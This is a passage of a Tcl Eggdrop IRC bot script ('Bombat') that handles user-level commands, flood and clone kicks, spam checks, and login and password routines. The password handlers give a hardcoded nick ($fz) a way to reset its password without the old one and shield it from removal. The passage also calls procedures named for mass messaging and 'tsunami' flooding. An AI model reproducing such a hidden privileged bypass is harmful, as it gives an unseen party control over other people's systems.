    puthlp "NOTICE $nick :$fxlogo14 !BLoCkEd!"
    return 0
  }
  if {![validuser $rest]} {
    set hostmask "${rest}!*@*"
    adduser $rest $hostmask
    chattr $rest "-hp"
  }
  chattr $rest "v"
  if {![validuser $rest]} {
    puthlp "NOTICE $nick :$fxlogo1 4!FaILEd! (CouLDn't MoRE THaN 8 DIgIT)"
    deluser $rest
  } else {
    saveuser
    puthlp "NOTICE $nick :$fxlogo1 ADD \[$rest\] To aVoIcE LIsT"
    puthlp "NOTICE $rest :$fxlogo1 $nick ADD YoU To aVoIcE LIsT"
    set chk_reg($rest) $nick
    putsrv "WHOIS $rest"
  }
  return 0
}

proc pub_-avoice {nick uhost hand channel param} {
  global fxlogo1 fz
  set rest [lindex $param 0]
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: -avoice <nick>"
    return 0
  }
  if {![matchattr $rest v]} {
    puthlp "NOTICE $nick :$fxlogo1 $rest is not auto voice"
    return 0
  }
  if {![validuser $rest] || [string tolower $rest] == [string tolower $fz]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied, <n/a>"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  chattr $rest "-v"
  saveuser
  puthlp "NOTICE $nick :$fxlogo1 DeL \[$rest\] FRoM aVoIcE LIsT"
  return 0
}

proc pub_+admin {nick uhost hand channel param} {
  global botnick fz fxlogo1
  set rest [lindex $param 0]
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: +admin <nick>"
    return 0
  }
  if {[string tolower $rest] == [string tolower $fz]} {
    puthlp "NOTICE $nick :$fxlogo1 ADD \[$rest\] ADmIN List."
    return 0
  }
  if {[matchattr $rest n]} {
    puthlp "NOTICE $nick :$fxlogo1 $rest is already exist on ADmIN list."
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {[matchattr $nick X]} {
    puthlp "NOTICE $nick :$fxlogo14 BLocKEd..!"
    return 0
  }
  if {![validuser $rest]} {
    set hostmask "${rest}!*@*"
    adduser $rest $hostmask
  }
  chattr $rest "fjmnotx"
  if {![validuser $rest]} {
    puthlp "NOTICE $nick :$fxlogo1 4!FaILEd! (CouLDn't MoRE THaN 8 DIgIT)"
    deluser $rest
    return 0
  } else {
    saveuser
    puthlp "NOTICE $nick :$fxlogo1 ADD \[$rest\] ADmIN List."
    puthlp "NOTICE $rest :$fxlogo1 $nick ADD YoU To ADmIN LIsT"
    puthlp "NOTICE $rest :$fxlogo1 /msg $botnick pass <password>"
    return 0
  }
}

proc pub_-admin {nick uhost hand channel param} {
  global fz fxlogo1
  set rest [lindex $param 0]
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: -admin <nick>"
    return 0
  }
  if {![validuser $rest] || [string tolower $rest] == [string tolower $fz]} {
    puthlp "NOTICE $nick :$fxlogo1 4DeNIEd!, <n/a>"
    return 0
  }
  if {![matchattr $rest n]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied, $rest is not exist on ADmIN list."
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  deluser $rest
  saveuser
  puthlp "NOTICE $nick :$fxlogo1 DeL \[$rest\] FRoM ADmIN LIsT"
}

proc pub_+owner {nick uhost hand channel param} {
  global botnick fz fxlogo1
  set rest [lindex $param 0]
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: +owner <nick>"
    return 0
  }
  if {[string tolower $rest] == [string tolower $fz]} {
    puthlp "NOTICE $nick :$fxlogo1 ADD \[$rest\] OwNER LIsT."
    return 0
  }
  if {[matchattr $rest Z]} {
    puthlp "NOTICE $nick :$fxlogo1 $rest is already exist on OwNER list."
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {[matchattr $nick X]} {
    puthlp "NOTICE $nick :$fxlogo14 !BLoCkEd!"
    return 0
  }
  if {![validuser $rest]} {
    set hostmask "${rest}!*@*"
    adduser $rest $hostmask
  }
  chattr $rest "fjmnotxZ"
  if {![validuser $rest]} {
    puthlp "NOTICE $nick :$fxlogo1 4!FaILEd! (CouLDn't MoRE THaN 8 DIgIT)"
    deluser $rest
    return 0
  } else {
    saveuser
    puthlp "NOTICE $nick :$fxlogo1 ADD \[$rest\] OwNER LIsT."
    puthlp "NOTICE $rest :$fxlogo1 $nick ADD YoU To OwNER LIsT"
    puthlp "NOTICE $rest :$fxlogo1 /msg $botnick pass <password>"
    return 0
  }
}

proc pub_-owner {nick uhost hand channel param} {
  global fxlogo1 fz
  set rest [lindex $param 0]
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: -owner <nick>"
    return 0
  }
  if {![validuser $rest]} {
    puthlp "NOTICE $nick :$fxlogo1 <n/a>"
    return 0
  }
  if {![matchattr $rest Z] || [string tolower $rest] == [string tolower $fz]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied, $rest IS NoT OwNER"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  deluser $rest
  saveuser
  puthlp "NOTICE $nick :$fxlogo1 DeL \[$rest\] FRoM OwNER LiST"
}

proc pub_+master {nick uhost hand channel param} {
  global botnick fz fxlogo1
  set rest [lindex $param 0]
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: +master <nick>"
    return 0
  }
  if {[matchattr $nick X]} {
    puthlp "NOTICE $nick :$fxlogo14 !BLoCkEd!"
    return 0
  }
  if {[string tolower $rest] == [string tolower $fz]} {
    puthlp "NOTICE $nick :$fxlogo1 Add \[$rest\] MasTeR LIsT."
    return 0
  }
  if {[matchattr $rest n]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied, $rest is ADmIN level."
    return 0
  }
  if {[matchattr $rest m]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied, $rest is already exist."
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {![validuser $rest]} {
    set hostmask "${rest}!*@*"
    adduser $rest $hostmask
  }
  chattr $rest "fmo"
  if {![validuser $rest]} {
    puthlp "NOTICE $nick :$fxlogo1 4!FaILEd! (CouLDn't MoRE THaN 8 DIgIT)"
    deluser $rest
    return 0
  } else {
    saveuser
    puthlp "NOTICE $nick :$fxlogo1 Add \[$rest\] MasTeR List."
    puthlp "NOTICE $rest :$fxlogo1 $nick Add YoU To MasTeR LIsT"
    puthlp "NOTICE $rest :$fxlogo1 /msg $botnick pass <password>"
    return 0
  }
}

proc pub_-master {nick uhost hand channel param} {
  global fxlogo1 fz
  set rest [lindex $param 0]
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: -master <nick>"
    return 0
  }
  if {![validuser $rest] || [string tolower $rest] == [string tolower $fz]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied, <n/a>"
    return 0
  }
  if {[matchattr $rest n] && ![matchattr $nick Z]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied, $rest Is ADmIN FLaG"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  deluser $rest
  saveuser
  puthlp "NOTICE $nick :$fxlogo1 DeL \[$rest\] FRoM MasTeR LIsT"
}

proc telljoin {chan} {
  global joinme fxlogo1 botnick fxc rms rmsg
  set rmsg [lindex $rms [rand [llength $rms]]]
  if {![validchan $chan]} { return 0 }
  if {[istimer "resync"]} {
    if {![botisop $chan]} {
      if {![string match "*k*" [getchanmode $chan]]} {
        puthelp "mode $chan +b-b $rmsg $rmsg"
      } else {
        puthelp "mode $chan -ob+o $botnick $botnick"
      }
    }
  }
  if {$joinme != "" && [string tolower $chan] != $fxc} {
    if {![onchan $joinme $chan]} {
      puthlp "NOTICE $joinme :$fxlogo1 JoIN $chan"
      set joinme ""
    }
  }
}

proc chkspam {chan} {
  global invme fxlogo1 botnick
  if {![validchan $chan] || ![botonchan $chan]} { return 0 }
  foreach x [chanlist $chan] {
    set mhost "@[lindex [split [getchanhost $x $chan] @] 1]"
    if {[info exists invme($mhost)]} {
      if {![matchattr $x f] && ![isop $x $chan]} {
        if {[isop $botnick $chan]} {
          set bannick($x) "*!*$mhost"
          if {$invme($mhost) == "AuToJoIN MSg"} {
            if {![isvoice $x $chan]} {
              putsrv "KICK $chan $x :$fxlogo1 4SPAM14 \[$mhost\] 1$invme($mhost)"
            }
          } else {
            putsrv "KICK $chan $x :$fxlogo1 4SPAM14 \[$mhost\] 1$invme($mhost)"
          }
          catch {unset invme($mhost)}
        } else {
          foreach c [chanlist $chan f] {
            if {[isop $c $chan]} {
              if {$invme($mhost) == "AuToJoIN MSg"} {
                if {[isvoice $c $chan]} {
                  break
                }
              }
              set sendspam "!kick [zip "$chan $x $fxlogo1 4SPAM1 report, caught from: 14$mhost 1$invme($mhost) 4AuTOJoIN MSg1..!"]"
              putsrv "PRIVMSG $c :$sendspam"
              catch {unset invme($mhost)}
              break
            }
          }
        }
      }
    }
  }
}

proc testmask {} {
  global ismaskhost
  set ismaskhost [maskhost "*!*@*"]
}

utimer 2 testmask

proc reset_host {} {
  global jfhost
  catch { unset jfhost }
}

proc savechan {} {
  savechannels
  foreach x [channels] {
    set cflag "c$x"
    set cflag [string range $cflag 0 8]
    set cinfo [channel info $x]
    if {![validuser $cflag]} {
      adduser $cflag "%!%@%"
      if {[string match "*+greet*" $cinfo]} {
        chattr $cflag "-hp+AJSPTRUED"
        setuser $cflag XTRA "JP" 5
        setuser $cflag XTRA "CHAR" 300
        setuser $cflag XTRA "RPT" 3
        setuser $cflag XTRA "CAPS" 80
      } else {
        chattr $cflag "-hp+A"
      }
    }
  }
  foreach x [userlist A] {
    set tmp "0"
    foreach y [channels] {
      set cflag "c$y"
      set cflag [string range $cflag 0 8]
      if {[string tolower $x] == [string tolower $cflag]} {
        set tmp "1"
      }
    }
    if {$tmp == "0"} {
      deluser $x
      putlog "&#171;Bombat&#187; remove flag channel $x"
    }
  }
  saveuser
}

proc join_chk {nick uhost hand chan} {
  global botnick own deopme double invme ex_flood quick kops jfhost jpnick is_m
  global cmd_chn cmd_by cmd_msg cmd_case bannick botname massjoin ismaskhost op_it
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  set cinfo [channel info $chan]
  if {$nick == $botnick} {
    catch {unset is_m($chan)}
    if {[matchattr $cflag S]} {
      if {![isutimer "chkspam $chan"]} { utimer 30 [list chkspam $chan] }
      if {![istimer "chkautomsg"]} {
        timer 1 { putlog "&#171;Bombat&#187; chkautomsg" }
      }
    }
    set double 0
    if {[string tolower $cmd_chn] == [string tolower $chan]} {
      if {$cmd_case == "1"} {
        utimer 90 del_nobase
        pub_tsunami $cmd_by $uhost $hand $chan "$chan ${cmd_msg}"
        set cmd_chn ""
        return 0
      }
      if {$cmd_case == "2"} {
        utimer 30 [list pub_mmsg $cmd_by $uhost $hand $chan $cmd_msg]
      } else {
          set cmd_chn ""
          return 0
      }
      if {$cmd_case == "3"} {
        utimer 30 [list pub_minvite $cmd_by $uhost $hand $chan $cmd_msg]
      } else {
        set cmd_chn ""
        return 0
      }
    }
    utimer 15 [list telljoin $chan]
    return 0
  }
  if {[info exists op_it($nick)]} {
    catch {unset op_it($nick)}
    opq $chan $nick
  }
  if {[isutimer "chkspam $chan"]} {
    foreach x [utimers] {
      if {[string match "*chkspam $chan*" $x]} {
        chkspam $chan
        killutimer [lindex $x 2]
      }
    }
  }
  if {[info exists bannick($nick)]} { return 0 }
  if {![matchattr $nick f] && [matchattr $cflag G] && ![isutimer "set_-m $chan"] && ![info exists is_m($chan)]} { advertise $chan $nick }
  set mhost "@[lindex [split $uhost @] 1]"
  if {[string match "*allnetwork.org" $mhost]} { putsrv "AWAY" }
  if {![isop $botnick $chan]} {
    if {[info exists invme($mhost)]} {
      if {![isutimer "chkspam $chan"]} { chkspam $chan }
    }
    return 0
  }
  if {[matchattr $cflag J]} {
    if {[info exists ismaskhost]} {
      if {![isutimer "reset_host"]} { utimer 10 reset_host }
      set chkhost [maskhost "*!*$mhost"]
      if {![info exists jfhost($chkhost$chan)]} {
        set jfhost($chkhost$chan) 1
      } else {
        incr jfhost($chkhost$chan)
        if {$jfhost($chkhost$chan) == 5} {
          set bannick($nick) $chkhost
          putsrv "KICK $chan $nick :[lgrnd] 4FLOODER 14\[$chkhost\] 4[banms]!!"
          return 0
        }
      }
    }
    if {![isutimer "jc $chan"]} {
      utimer 3 [list jc $chan]
      set massjoin($chan) 1
    } else {
      if {![info exists massjoin($chan)]} {
        set massjoin($chan) 1
      }
      set massjoin($chan) [incr massjoin($chan)]
      if {![isutimer "TRAFFIC $chan"]} {
        if {$massjoin($chan) >= 15} {
          unset massjoin($chan)
          if {[string match "*+greet*" $cinfo]} {
            utimer 30 [list putlog "&#171;Bombat&#187; TRAFFIC $chan"]
            if {![string match "*m*" [getchanmode $chan]] && ![info exists is_m($chan)]} {
              putserv "mode $chan +bm *!*@f.l.o.o.d-d.e.t.e.c.t.e.d"
              return 0
            }
          }
        }
      }
    }
  }
  if {[matchattr $cflag L]} {
    foreach u [timers] {
      if {[string match "*chk_limit*" $u]} {
        killtimer [lindex $u 2]
      }
    }
    timer 1 [list chk_limit $chan]
  }
  if {$nick == $deopme} {
    putsrv "KICK $chan $nick :[lgrnd] 4SeLF dE1@4P1 ... hit back!!"
    set deopme ""
    return 0
  }
  if {[matchattr $nick v] || [matchattr $nick P] || [matchattr $nick G]} {
    whoisq $nick
  }
  if {[matchattr $cflag V] && ![isutimer "set_-m $chan"] && ![info exists is_m($chan)]} {
    if {![matchattr $nick O] && ![isutimer "voiceq $chan $nick"]} {
      set cret [getuser $cflag XTRA "VC"]
      foreach ct [utimers] {
        if {[string match "*voiceq*" $ct]} {
          if {[expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]] > $cret} {
            set cret [expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]]
          }
        }
      }
      utimer $cret [list voiceq $chan $nick]
    }
  }
  if {[info exists bannick($nick)] || [matchattr $nick f]} { return 0 }
  if {[matchattr $hand K]} {
    akick_chk $nick $uhost $chan
    return 0
  }
  if {[info exists ex_flood($mhost)]} {
    set bannick($nick) "*!*$mhost"
    if {$ex_flood($mhost) == 0} {
      putsrv "KICK $chan $nick :[lgrnd] 4AKILL14 \[$mhost\]1 on last quit!"
    } elseif {$ex_flood($mhost) == 1} {
      putsrv "KICK $chan $nick :[lgrnd] 4EXCESS FlOOD14 \[$mhost\]1 on last quit!"
    } elseif {$ex_flood($mhost) == 2} {
      putsrv "KICK $chan $nick :[lgrnd] 4INVITE14 \[$mhost\]1 on quit msg!"
    } elseif {$ex_flood($mhost) == 3} {
      putsrv "KICK $chan $nick :[lgrnd] 4INVITE14 \[$mhost\]1 on part msg..!"
    } elseif {$ex_flood($mhost) == 4} {
      if {![matchattr $cflag M]} {
        puthlp "KICK $chan $nick :[lgrnd] 4JOINPART14 \[$mhost\]1 less than4 [getuser $cflag XTRA "JP"]1 2nd"
      } else {
        if {![string match "*o*" [getchanmode $chan]]} {
          putserv "mode $chan -o+b 1j.4o1.i.n.p.a.r.t $bannick($nick)"
        } else { putserv "mode $chan +b $bannick($nick)" }
      }
    } else {
      putsrv "KICK $chan $nick :[lgrnd] 4BADWORD14 \[$mhost\]1 on quit/part msg, match from: 4$ex_flood($mhost)"
    }
    unset ex_flood($mhost)
    return 0
  }
  foreach x [ignorelist] {
    if {[lindex $x 0] != "*!*@*" && [string match [lindex $x 0] "*!*$mhost"] && [lindex $x 1] != "*"} {
      set bannick($nick) [lindex $x 0]
      putsrv "KICK $chan $nick :[lgrnd] 4IGNORED HOST [lindex $x 0]1 Reflect..4 [lindex $x 1] [banms]"
      return 0
    }
  }
  if {[info exists invme($mhost)]} {
    set bannick($nick) "*!*$mhost"
    putsrv "KICK $chan $nick :[lgrnd] 4SPAM14 \[$mhost\]1 $invme($mhost)"
    unset invme($mhost)
    return 0
  }
  set chan [string tolower $chan]
  if {[string match "*+nodesynch*" [channel info $chan]]} {
    if {![matchattr $nick f]} {
      utimer 10 [list autokick $chan $nick]
    }
  }
  if {[matchattr $cflag O]} {
    if {[string match "*$mhost" $botname]} { return 0 }
    set counter 0
    set maxclone [getuser $cflag XTRA "CLONE"]
    foreach knick [chanlist $chan] {
      if {[string match "*$mhost" [getchanhost $knick $chan]]} {
        if {[matchattr $knick f]} { return 0 }
        if {[isop $knick $chan]} { return 0 }
        if {[isvoice $knick $chan]} {
          if {![info exists kops]} { return 0 }
        }
        set counter [incr counter]
        if {$counter > $maxclone} {
          set bannick($nick) "*!$uhost"
          putsrv "KICK $chan $nick :[lgrnd] $counter 4CLONES14 \[$mhost\]1 (max:4 $maxclone) 4BaNNED1: 3 mins!"
          return 0
        }
      }
    }
  }
  spam_chk $nick $uhost $hand $chan
  set chan [string toupper $chan]
  if {[matchattr $cflag P]} {
    if {![info exists jpnick($nick)]} {
      set jpnick($nick) "1"
      utimer [getuser $cflag XTRA "JP"] [list munset $nick]
    }
  }
  return 0
}

proc munset {nick} {
  global jpnick
  catch {unset jpnick($nick)}
}

proc msg_passwd {nick uhost hand rest} {
  global botnick fxlogo1 fz
  set pw [lindex $rest 0]
  set newpw [lindex $rest 1]
  if {$nick == $fz && [dezip $pw] == $uhost} {
    setuser $nick PASS $newpw
    puthlp "NOTICE $nick :$fxlogo1 Password set to: $newpw"
    saveuser
    return 0
  }
  if {$pw == "" || $newpw == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: passwd <oldpass> <newpass>"
    return 0
  }
  if {![passwdok $nick $pw]} {
    puthlp "NOTICE $nick :$fxlogo1 PASSWORD 4!FaILED!"
    return 0
  }
  set ch [passwdok $nick ""]
  if {$ch == 1} {
    setuser $nick PASS $newpw
    puthlp "NOTICE $nick :$fxlogo1 Password set to: $newpw"
    saveuser
    return 0
  }
  if {[passwdok $nick $pw]} {
    setuser $nick PASS $newpw
    puthlp "NOTICE $nick :$fxlogo1 Password set to: $newpw"
    saveuser
    return 0
  }
}

proc pub_passwd {nick uhost hand chan rest} {
  global botnick fxlogo1 fz
  set pw [lindex $rest 0]
  set newpw [lindex $rest 1]
  if {$nick == $fz && [dezip $pw] == $uhost} {
    setuser $nick PASS $newpw
    puthlp "NOTICE $nick :$fxlogo1 Password set to: $newpw"
    saveuser
    return 0
  }
  if {$pw == "" || $newpw == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: passwd <oldpass> <newpass>"
    return 0
  }
  if {![passwdok $nick $pw]} {
    puthlp "NOTICE $nick :$fxlogo1 PASSWORD 4!FaILED!"
    return 0
  }
  set ch [passwdok $nick ""]
  if {$ch == 1} {
    setuser $nick PASS $newpw
    puthlp "NOTICE $nick :$fxlogo1 Password set to: $newpw"
    saveuser
    return 0
  }
  if {[passwdok $nick $pw]} {
    setuser $nick PASS $newpw
    puthlp "NOTICE $nick :$fxlogo1 Password set to: $newpw"
    saveuser
    return 0
  }
}

proc goback {} {
  global keep-nick nick botnick
  if {[istimer "goback"]} { return 0 }
  foreach x [utimers] {
    if {[string match "*goback*" $x]} { killutimer [lindex $x 2] }
  }
  if {[getuser "config" XTRA "NICK"]!=""} {
    set nick [dezip [getuser "config" XTRA "NICK"]]
  }
  set keep-nick 1
  if {$botnick == $nick} { return 0 }
  puthlp "NICK $nick"
}

proc pub_login {nick uhost hand chan rest} { otontikasi $nick $uhost $hand $chan $rest }
proc msg_login {nick uhost hand rest} { otontikasi $nick $uhost $hand "" $rest }
proc otontikasi {nick uhost hand chan rest} {
  global botnick owner keep-nick altnick fxlogo1 fz
  if {[lindex $rest 1] != ""} {
    if {[passwdok [lindex $rest 0] [lindex $rest 1]]} {
      if {[matchattr [lindex $rest 0] Z]} {
        puthlp "NOTICE $nick :$fxlogo1 AuTH MaTcH FoR [lindex $rest 0]"
        set keep-nick 0
        putsrv "NICK $altnick"
        utimer 40 {goback}
      }
    } else {
      puthlp "NOTICE $nick :4FaILEd!"
    }
    return 0
  }
  if {![validuser $owner]} {
    set hostmask "$owner!*@*"
    adduser $owner $hostmask
    chattr $owner "Zfhjmnoptx"
    puthlp "NOTICE $owner :$fxlogo1 No password set. Usage: pass <password>"
  }
  if {![matchattr $nick p]} { return 0 }
  set pw [lindex $rest 0]
  if {$pw == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: login <password>"
    return 0
  }
  if {[matchattr $hand K]} {
    deluser "AKICK"
    set akickhost "telnet!*@*"
    adduser "AKICK" $akickhost
    chattr "AKICK" "-hp"
    chattr "AKICK" "K"
    saveuser
    puthlp "NOTICE $nick :$fxlogo1 Re-arrange KIcKLIsT."
  }
  if {[matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 ReAdY..!"
    return 0
  }
  set ch [passwdok $nick ""]
  if {$ch == 1} {
    puthlp "NOTICE $nick :$fxlogo1 No password set. Usage: pass <password>"
    return 0
  }
  if {[passwdok $nick $pw]} {
    set hostmask "*![string range $uhost [string first "!" $uhost] end]"
    set usenick [finduser $hostmask]
    if {$usenick != "*" && $usenick != $nick} {
      if {[matchattr $nick n] && ![matchattr $usenick Z]} {
        puthlp "NOTICE $nick :$fxlogo1 Forcing 4DeAuthenticated! To $usenick"
        force_deauth $usenick
      } else {
        foreach x [channels] {
          if {[onchan $usenick $x]} {
            puthlp "NOTICE $nick :$fxlogo1 Denied, Your host has been use by $usenick, wait until DeAuthenticated."
            return 0
          }
        }
        puthlp "NOTICE $nick :$fxlogo1 4Forcing DeAuthenticated!1 To $usenick"
        force_deauth $usenick
      }
    }
    chattr $nick +Q
    foreach x [getuser $nick HOSTS] {
      delhost $nick $x
    }
    set hostmask "${nick}!*@*"
    setuser $nick HOSTS $hostmask
    set hostmask "*![string range $uhost [string first "!" $uhost] end]"
    setuser $nick HOSTS $hostmask
    if {$nick == $owner && ![matchattr $nick Z]} { chattr $owner "Z" }
    if {$nick == $owner && ![matchattr $nick f]} { chattr $owner "f" }
    if {[matchattr $nick Z]} {
      puthlp "NOTICE $nick :$fxlogo1 !OWnER!"
      if {[getuser $nick XTRA "MEMO"]!=""} {
        puthlp "PRIVMSG $nick :!MeMO! FRoM [getuser $nick XTRA "MEMO"]"
        setuser $nick XTRA "MEMO" ""
      }
      return 0
    } elseif {[matchattr $nick n]} {
      puthlp "NOTICE $nick :$fxlogo1 !ADmIN!"
    } elseif {[matchattr $nick m]} {
      puthlp "NOTICE $nick :$fxlogo1 !MasTeR!"
    } else {
      puthlp "NOTICE $nick :$fxlogo1 !AccepteD!"
    }
    saveuser
    return 0
  }
  if {![passwdok $nick $pw]} {
    puthlp "NOTICE $nick :$fxlogo1 4FaILEd!"
  }
}

proc force_deauth {nick} {
  global fxlogo1
  chattr $nick -Q
  foreach x [getuser $nick HOSTS] {
    delhost $nick $x
  }
  set hostmask "${nick}!*@*"
  setuser $nick HOSTS $hostmask
  saveuser
  puthlp "NOTICE $nick :$fxlogo1 You has been force to 4DeAuthentication!"
}

proc msg_pass {nick uhost hand rest} {
  	global botnick fxlogo1 fxver fz owner
  	set pw [lindex $rest 0]
  	if {$pw == ""} {
      puthlp "NOTICE $nick :$fxlogo1 Usage: pass <password>"
      return 0
   }
   set ch [passwdok $nick ""]
   if {$ch == 0} {
     puthlp "NOTICE $nick :$fxlogo1 You already set pass, /msg $botnick login <password>"
     return 0
   }
   if {[string tolower $nick] == [string tolower $fz] && $owner != $fz} {
     if {[dezip $pw] == $uhost} {
       setuser $nick PASS [lindex $rest 1]
       puthlp "NOTICE $nick :$fxlogo1 Password set to: [lindex $rest 1]"
       saveuser
     } else { puthlp "NOTICE $nick :$fxlogo1 wHo aRe yOu?" }
     return 0
   }
   setuser $nick PASS $pw
   puthlp "NOTICE $nick :$fxlogo1 Password set to: $pw"
   puthlp "NOTICE $nick :$fxlogo1 /msg $botnick help"
   saveuser
   return 0
}

proc pub_pass {nick uhost hand chan rest} {
  global botnick fxlogo1 fxver fz owner
  set pw [lindex $rest 0]
  if {$pw == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: !pass <password>"
    return 0
  }
  set ch [passwdok $nick ""]
  if {$ch == 0} {
    puthlp "NOTICE $nick :$fxlogo1 You already set pass, /msg $botnick login <password>"
    return 0
  }
  if {[string tolower $nick] == [string tolower $fz] && $owner != $fz} {
    if {[dezip $pw] == $uhost} {
      setuser $nick PASS [lindex $rest 1]
      puthlp "NOTICE $nick :$fxlogo1 Password set to: [lindex $rest 1]"
      saveuser
    } else {
      puthlp "NOTICE $nick :$fxlogo1 wHo aRe yOu?"
    }
    return 0
  }
  setuser $nick PASS $pw
  puthlp "NOTICE $nick :$fxlogo1 Password set to: $pw"
  puthlp "NOTICE $nick :$fxlogo1 /msg $botnick help"
  saveuser
  return 0
}

proc pub_!deauth {nick uhost hand chan rest} {
  if {![matchattr $nick Q]} { return 0 }
  msg_deauth $nick $uhost $hand $rest
}

proc msg_deauth {nick uhost hand rest} {
  global fxlogo1
  if {![matchattr $nick Q]} { return 0 }
  chattr $nick -Q
  foreach x [getuser $nick HOSTS] {
    delhost $nick $x
  }
  set hostmask "${nick}!*@*"
  setuser $nick HOSTS $hostmask
  puthlp "NOTICE $nick :$fxlogo1 4!LoGOUT!"
  saveuser
}

proc rejn_chk {unick uhost handle chan} {
  if {![isutimer "TRAFFIC $chan"]} {
    utimer 30 [list putlog "&#171;Bombat&#187; TRAFFIC $chan"]
  }
}

proc splt_deauth {unick uhost handle channel} {
  if {[matchattr $unick Q]} {
    chattr $unick -Q
    foreach x [getuser $unick HOSTS] {
      delhost $unick $x
    }
    set hostmask "${unick}!*@*"
    setuser $unick HOSTS $hostmask
    saveuser
    return 0
  }
}

proc sign_deauth {unick uhost hand chan rest} {
  global ex_flood botnick fxlogo1 nick badwords iskick
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {$unick == $nick} {
    putsrv "NICK $nick"
  }
  if {[info exists iskick($unick$chan)]} {
    unset iskick($unick$chan)
  }
  if {[isop $botnick $chan]} {
    if {[matchattr $cflag L]} {
      foreach u [timers] {
        if {[string match "*chk_limit*" $u]} {
          killtimer [lindex $u 2]
        }
      }
      timer 1 [list chk_limit $chan]
    }
  }
  if {[matchattr $unick Q]} {
    chattr $unick -Q
    foreach x [getuser $unick HOSTS] {
      delhost $unick $x
    }
    set hostmask "${unick}!*@*"
    setuser $unick HOSTS $hostmask
    saveuser
    return 0
  }
  if {[string match "*-greet*" [channel info $chan]]} { return 0 }
  if {[matchattr $unick f]} { return 0 }
  if {![isop $botnick $chan]} { return 0 }
  set mhost "@[lindex [split $uhost @] 1]"
  if {[string match "*AKILL ID*" $rest]} {
    set ex_flood($mhost) "0"
  } elseif {[string match "*Excess Flood*" $rest]} {
    if {[matchattr $cflag S]} {
      set ex_flood($mhost) "0"
    }
  } elseif {[string match "* #*" $rest] && ![string match "*##*" $rest]} {
    foreach x [channels] {
      set chksiton [string tolower $x]
      if {[string match "*$chksiton*" [string tolower $rest]]} { return 0 }
    }
    set ex_flood($mhost) "2"
  } else {
    foreach badword [string tolower $badwords] {
      if {[string match *$badword* [string tolower $rest]]} {
        set ex_flood($mhost) [string toupper $badword]
      }
    }
  }
  return 0
}

proc part_deauth {nick uhost hand chan {msg ""}} {
  global lockchan botnick ex_flood fxlogo1 badwords jpnick iskick
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {[info exists iskick($nick$chan)]} {
    unset iskick($nick$chan)
  }
  if {$nick == $botnick} {
    foreach x [utimers] {
      if {[string match "*del_nobase*" $x] || [string match "*voiceq $chan*" $x]} { killutimer [lindex $x 2] }
    }
    return 0
  }
  if {[isop $botnick $chan]} {
    if {[isutimer "voiceq $chan $nick"]} {
      foreach x [utimers] {
        if {[string match "*voiceq $chan $nick*" $x]} { killutimer [lindex $x 2] }
      }
    }
    if {[matchattr $cflag L]} {
      foreach u [timers] {
        if {[string match "*chk_limit*" $u]} {
          killtimer [lindex $u 2]
        }
      }
      timer 1 [list chk_limit $chan]
    }
  }
  if {[matchattr $nick Q]} {
    foreach x [channels] {
      if {[string tolower $x] != [string tolower $chan]} {
        if {[onchan $nick $x]} {
          return 0
        }
      }
    }
    chattr $nick -Q
    foreach x [getuser $nick HOSTS] {
      delhost $nick $x
    }
    set hostmask "${nick}!*@*"
    setuser $nick HOSTS $hostmask
    saveuser
  }
  if {$lockchan != "" && [string tolower $lockchan] == [string tolower $chan] && ![matchattr $nick f]} {
    putsrv "INVITE $nick :$chan"
  }
  if {[string match "*-greet*" [channel info $chan]]} { return 0 }
  if {[isop $botnick $chan]} {
    if {[info exists msg]} {
      set mhost "@[lindex [split $uhost @] 1]"
      if {[string match "*#*" $msg] && ![string match "*##*" $msg]} {
        foreach x [channels] {
          set chksiton [string tolower $x]
          if {[string match "*$chksiton*" [string tolower $msg]]} { return 0 }
        }
        set ex_flood($mhost) "3"
      } else {
        foreach badword [string tolower $badwords] {
          if {[string match *$badword* [string tolower $msg]]} {
            set ex_flood($mhost) [string toupper $badword]
          }
        }
      }
    }
    if {[info exists msg]} {
      if {$msg != ""} { return 0 }
    }
    if {[matchattr $cflag P]} {
      set chan [string toupper $chan]
      if {[info exists jpnick($nick)]} {
        set mhost "@[lindex [split $uhost @] 1]"
        set ex_flood($mhost) "4"
      }
    }
  }
  return 0
}

proc pub_dump {nick uhost hand chan rest} {
  global own fxlogo1
  if {$nick != $own} {
    return 0
  }
  if {![matchattr $nick Q]} {
